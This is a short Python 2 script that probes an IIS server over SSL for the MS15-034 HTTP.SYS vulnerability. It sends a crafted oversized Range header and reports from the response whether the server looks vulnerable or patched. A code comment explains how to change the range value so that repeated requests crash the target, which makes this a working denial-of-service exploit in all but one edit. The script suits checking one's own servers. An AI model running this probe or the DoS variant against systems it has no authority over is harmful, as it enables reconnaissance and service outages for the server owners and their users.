#!/usr/bin/env python
# -*- coding: utf-8 -*-
# check a remote IIS server for MS15-034 (HTTP.SYS DoS vuln)
# usage: python ms15-034-ssl.py [ip] [hostname] [port]

import socket
import ssl
import sys
import time

print '''
    __    __  __                                                __
   / /_  / /_/ /_____    _______  _______            __________/ /
  / __ \/ __/ __/ __ \  / ___/ / / / ___/  ______   / ___/ ___/ / 
 / / / / /_/ /_/ /_/ / (__  ) /_/ (__  )  /_____/  (__  |__  ) /  
/_/ /_/\__/\__/ .___(_)____/\__, /____/           /____/____/_/   
             /_/           /____/                                 
'''
class x:
    r = '\033[91m'
    b = '\033[0m'

print x.r + "USAGE: python ms15-034-ssl.py [IP] [HOSTNAME] [PORT]" + "\n" + x.b

ip = sys.argv[1]
hostname = sys.argv[2]
port = sys.argv[3]

print ("Checking " + ip + " for MS15-034 (HTTP.SYS) vulnerability over SSL" + "\n")
time.sleep (3)

# create an SSL connection to the target and print ciphers in use
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_ssl = ssl.wrap_socket(s)
s_ssl.connect((ip, int(port)))
print x.r + "CIPHERS IN USE: " + x.b + str(s_ssl.cipher()) + "\n"

# set the non-DoS'ing range bytes value. changing this value to 18-18446744073709551615" should DoS the target after a few requests..
range_val = "0-18446744073709551615"

# throw the range bytes value at the target and check its response
check_vuln = "GET / HTTP/1.1\r\nHost: " + hostname + "\r\nRange: bytes=" + range_val + "\r\n\r\n"
s_ssl.write(check_vuln)
response = s_ssl.read()

if "416 Requested Range Not Satisfiable" in response:
        print x.r + ip + " IS PROBABLY VULNERABLE ['REQUESTED RANGE NOT SATISFIABLE' IN RESPONSE]:\n\n" + x.b + response + ""
elif " The request has an invalid header name" in response:
        print x.r + ip + " LOOKS PATCHED FOR MS15-034 VULN:" + "\n\n" + x.b + response + ""

check_ver = "GET / HTTP/1.0\r\n\r\n"
s_ssl.write(check_ver)
response = s_ssl.read()

if "IIS" not in response:
                print x.r + "I DON'T THINK " + ip + " IS AN IIS SERVER. CHECK FAILED." + "\n\n" + x.b + response + ""

s_ssl.close()